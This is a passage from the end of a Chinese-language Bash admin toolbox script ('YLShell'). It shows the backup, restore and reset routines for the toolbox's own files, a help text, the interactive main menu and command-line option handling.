        *)
            echo -e "${RED}无效选择${NC}"
            return
            ;;
    esac
}

backup_config() {
    echo -e "${BOLD}备份工具箱配置${NC}"

    local backup_time=$(date +%Y%m%d_%H%M%S)
    local backup_file="$BACKUP_DIR/toolbox_config_$backup_time.tar.gz"

    echo -e "${CYAN}正在备份配置...${NC}"

    local temp_dir="/tmp/toolbox_backup_$backup_time"
    mkdir -p "$temp_dir"

    cp "$SCRIPT_PATH" "$temp_dir/shell.sh"

    [ -f "$LOG_FILE" ] && cp "$LOG_FILE" "$temp_dir/operations.log"
    [ -f "$ERROR_LOG" ] && cp "$ERROR_LOG" "$temp_dir/errors.log"

    cat > "$temp_dir/backup_info.txt" << EOF
备份时间: $(date)
工具箱版本: $TOOLBOX_VERSION
操作系统: $OS_NAME
备份内容:
  - 主脚本
  - 操作日志
  - 错误日志
EOF

    tar -czf "$backup_file" -C "/tmp" "toolbox_backup_$backup_time"

    rm -rf "$temp_dir"

    echo -e "${GREEN}配置备份完成！${NC}"
    echo -e "备份文件: $backup_file"
    echo -e "大小: $(du -h "$backup_file" | cut -f1)"

    log_operation "备份配置" "文件: $backup_file" "SUCCESS"
}

restore_config() {
    echo -e "${BOLD}恢复工具箱配置${NC}"

    local backup_files=("$BACKUP_DIR"/toolbox_config_*.tar.gz)

    if [ ${#backup_files[@]} -eq 0 ] || [ ! -f "${backup_files[0]}" ]; then
        echo -e "${YELLOW}没有找到备份文件${NC}"
        return
    fi

    echo -e "${CYAN}可用的备份:${NC}"
    local count=1
    for backup in "${backup_files[@]}"; do
        backup_date=$(echo "$backup" | grep -o '[0-9]\{8\}_[0-9]\{6\}' | head -1)
        backup_size=$(du -h "$backup" 2>/dev/null | cut -f1)
        echo "$count. $backup_date ($backup_size)"
        ((count++))
    done

    read -p "选择要恢复的备份编号: " backup_num

    if ! [[ "$backup_num" =~ ^[0-9]+$ ]] || [ "$backup_num" -ge "$count" ] || [ "$backup_num" -lt 1 ]; then
        echo -e "${RED}无效的编号${NC}"
        return
    fi

    local selected_backup="${backup_files[$((backup_num-1))]}"

    if ! confirm_action "恢复备份: $selected_backup？" "n"; then
        return
    fi

    echo -e "${CYAN}正在恢复配置...${NC}"

    local temp_dir="/tmp/toolbox_restore_$(date +%Y%m%d_%H%M%S)"
    mkdir -p "$temp_dir"
    tar -xzf "$selected_backup" -C "$temp_dir"

    local backup_dir=$(find "$temp_dir" -type d -name "toolbox_backup_*" | head -1)
    if [ -n "$backup_dir" ]; then
        if [ -f "$backup_dir/shell.sh" ]; then
            cp "$backup_dir/shell.sh" "$SCRIPT_PATH"
            chmod +x "$SCRIPT_PATH"
            echo -e "${GREEN}主脚本已恢复${NC}"
        fi

        if [ -f "$backup_dir/operations.log" ]; then
            cp "$backup_dir/operations.log" "$LOG_FILE"
            echo -e "${GREEN}操作日志已恢复${NC}"
        fi

        if [ -f "$backup_dir/errors.log" ]; then
            cp "$backup_dir/errors.log" "$ERROR_LOG"
            echo -e "${GREEN}错误日志已恢复${NC}"
        fi
    else
        echo -e "${RED}备份内容格式不兼容${NC}"
    fi

    rm -rf "$temp_dir"

    echo -e "${GREEN}配置恢复完成！${NC}"
    echo -e "${YELLOW}请重新启动工具箱${NC}"

    log_operation "恢复配置" "从: $selected_backup" "SUCCESS"
}

reset_toolbox() {
    echo -e "${BOLD}重置工具箱${NC}"
    echo -e "${RED}========================================${NC}"
    echo -e "${YELLOW}警告: 这将删除所有配置和日志${NC}"
    echo -e "${YELLOW}但不会影响系统其他文件${NC}"
    echo -e "${RED}========================================${NC}"

    if ! confirm_action "确定要重置工具箱？" "n"; then
        return
    fi

    echo -e "${CYAN}正在重置工具箱...${NC}"

    backup_config

    [ -f "$CONFIG_FILE" ] && rm -f "$CONFIG_FILE"

    [ -f "$LOG_FILE" ] && rm -f "$LOG_FILE"
    [ -f "$ERROR_LOG" ] && rm -f "$ERROR_LOG"

    [ -d "$BACKUP_DIR" ] && rm -rf "$BACKUP_DIR"
    [ -d "$SCAN_RESULTS_DIR" ] && rm -rf "$SCAN_RESULTS_DIR"

    [ -f "$LOCK_FILE" ] && rm -f "$LOCK_FILE"

    echo -e "${GREEN}工具箱已重置！${NC}"
    echo -e "${YELLOW}请重新启动工具箱${NC}"

    exit 0
}

show_help() {
    echo -e "${BOLD}YLShell工具箱帮助文档${NC}"

    cat << EOF

${CYAN}一、基本使用${NC}
1. 启动: ./shell.sh 或 bash shell.sh
2. 主菜单: 交互式选择功能
3. 快捷键: 输入数字选择对应功能

${CYAN}二、命令行参数${NC}
  -v, --version    显示版本信息
  -h, --help       显示帮助信息
  --panel          直接进入面板安装菜单
  --benchmark      直接运行服务器测评
  --update         更新工具箱到最新版本
  --backup-all     执行完整备份
  --backup-configs 备份配置文件
  --backup-websites 备份网站数据
  --backup-databases 备份数据库

${CYAN}三、主要功能模块${NC}
1.  面板安装中心 - 各种服务器面板安装
2.  服务器测评 - 性能测试和监控
3.  系统工具 - 系统管理和优化
4.  网络扫描中心 - 局域网扫描、端口扫描、漏洞检测
5.  安全工具 - 安全扫描和防护
6.  备份与恢复 - 数据备份和恢复
7.  容器管理 - Docker和容器管理
8.  性能优化 - 系统性能优化
9.  系统深入检查 - 健康检查、安全基线、性能分析
10.  命令行效率 - 别名管理、函数封装、批量操作
11.   脚本加密 - shc加密、Base64混淆、密码保护
12.  工具箱设置 - 工具箱配置和管理

${CYAN}四、使用建议${NC}
1. 生产环境谨慎操作
2. 重要操作前先备份
3. 关注日志记录
4. 定期更新工具箱

${CYAN}五、常见问题${NC}
1. 权限问题: 使用sudo或root用户
2. 网络问题: 检查网络连接
3. 脚本问题: 查看错误日志
4. 功能问题: 更新到最新版本
EOF
}

# ==================== 工具箱主菜单 ====================
main_menu() {
    while true; do
        show_header
        local uptime_str=$(uptime -p 2>/dev/null | sed 's/up //' || echo "未知")
        local load_avg=$(uptime | awk -F'load average:' '{print $2}' | xargs)
        echo -e "${CYAN}运行时间:${NC} $uptime_str ${BLUE}|${NC} ${CYAN}系统负载:${NC} $load_avg"
        echo -e "${CYAN}════════════════════════════════════════════════════════════${NC}"
        echo -e "${BOLD}${PURPLE}YLShell 工具箱 v$TOOLBOX_VERSION"
        echo -e "${BOLD}${GREEN}主菜单${NC}\n"
        echo -e "${BLUE}1.${NC}  面板安装中心"
        echo -e "${BLUE}2.${NC}  服务器测评中心"
        echo -e "${BLUE}3.${NC}  系统工具"
        echo -e "${BLUE}4.${NC}  网络扫描中心"
        echo -e "${BLUE}5.${NC}  安全工具"
        echo -e "${BLUE}6.${NC}  备份与恢复"
        echo -e "${BLUE}7.${NC}  容器管理"
        echo -e "${BLUE}8.${NC}  性能优化"
        echo -e "${BLUE}9.${NC}  系统深入检查"
        echo -e "${BLUE}10.${NC} 命令行效率"
        echo -e "${BLUE}11.${NC}  脚本加密"
        echo -e "${BLUE}12.${NC}  工具箱设置"
        echo -e "${BLUE}0.${NC}   退出"
        echo ""
        read -p "请选择操作 (0-12): " choice

        case $choice in
            1) panel_install_menu ;;
            2) benchmark_menu ;;
            3) system_tools_menu ;;
            4) network_scan_menu ;;
            5) security_tools_menu ;;
            6) backup_menu ;;
            7) container_menu ;;
            8) performance_menu ;;
            9) deep_inspection_menu ;;
            10) cli_efficiency_menu ;;
            11) script_encryption_menu ;;
            12) toolbox_settings_menu ;;
            0)
                echo -e "${GREEN}感谢使用 YLShell 工具箱！${NC}"
                exit 0
                ;;
            *)
                echo -e "${RED}无效选择${NC}"
                sleep 1
                ;;
        esac
    done
}

# ==================== 主程序入口 ====================
main() {
    init_toolbox
    stty erase ^H 2>/dev/null || true
    show_header
    echo -e "${BOLD}欢迎使用 YLShell 工具箱 v$TOOLBOX_VERSION${NC}\n"
    echo -e "${CYAN}系统检测: $OS_NAME ($PKG_MANAGER)${NC}"
    echo -e "${CYAN}工具箱功能:${NC}"
    echo -e "   面板安装 (宝塔/1Panel/X-UI等)"
    echo -e "   服务器测评 (融合怪/Bench.sh等)"
    echo -e "   系统工具 (Swap/BBR/防火墙等)"
    echo -e "   网络扫描中心 (局域网/端口/漏洞扫描)"
    echo -e "   安全工具 (安全扫描/加固等)"
    echo -e "   备份与恢复 (数据备份/恢复)"
    echo -e "   容器管理 (Docker/容器操作)"
    echo -e "   性能优化 (系统调优/优化)"
    echo -e "   系统深入检查 (健康/基线/性能分析)"
    echo -e "   命令行效率 (别名/函数/批量操作)"
    echo -e "   脚本加密 (shc/Base64/密码保护)"
    echo -e "   工具箱设置 (更新/配置/日志)"
    echo -e "\n${YELLOW}按回车键开始使用...${NC}"
    read -r

    main_menu
}

if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    case "${1:-}" in
        --version|-v)
            echo "YLShell 工具箱 v$TOOLBOX_VERSION"
            exit 0
            ;;
        --help|-h)
            echo "使用: $0 [选项]"
            echo "选项:"
            echo "  -v, --version     显示版本"
            echo "  -h, --help        显示帮助"
            echo "  --scan            直接进入网络扫描中心"
            echo "  --deep-check      直接进入系统深入检查"
            echo "  --encrypt <file>  加密指定脚本文件"
            exit 0
            ;;
        --scan)
            init_toolbox
            network_scan_menu
            exit 0
            ;;
        --deep-check)
            init_toolbox
            deep_inspection_menu
            exit 0
            ;;
        --encrypt)
            if [ -n "${2:-}" ] && [ -f "$2" ]; then
                init_toolbox
                echo -e "${CYAN}直接加密脚本: $2${NC}"
                script_path="$2"
                if command -v shc &>/dev/null || encrypt_install_shc; then
                    shc -f "$script_path"
                    if [ -f "${script_path}.x" ]; then
                        echo -e "${GREEN}加密成功: ${script_path}.x${NC}"
                    fi
                fi
            else
                echo "请指定一个有效的脚本文件: $0 --encrypt <file>"
            fi
            exit 0
            ;;
        --benchmark)
            init_toolbox
            benchmark_menu
            exit 0
            ;;
        --update)
            init_toolbox
            update_toolbox
            exit 0
            ;;
        --backup-all)
            init_toolbox
            backup_configs
            backup_websites
            backup_databases
            exit 0
            ;;
        --backup-configs)
            init_toolbox
            backup_configs
            exit 0
            ;;
        --backup-websites)
            init_toolbox
            backup_websites
            exit 0
            ;;
        --backup-databases)
            init_toolbox
            backup_databases
            exit 0
            ;;
    esac
    main
fi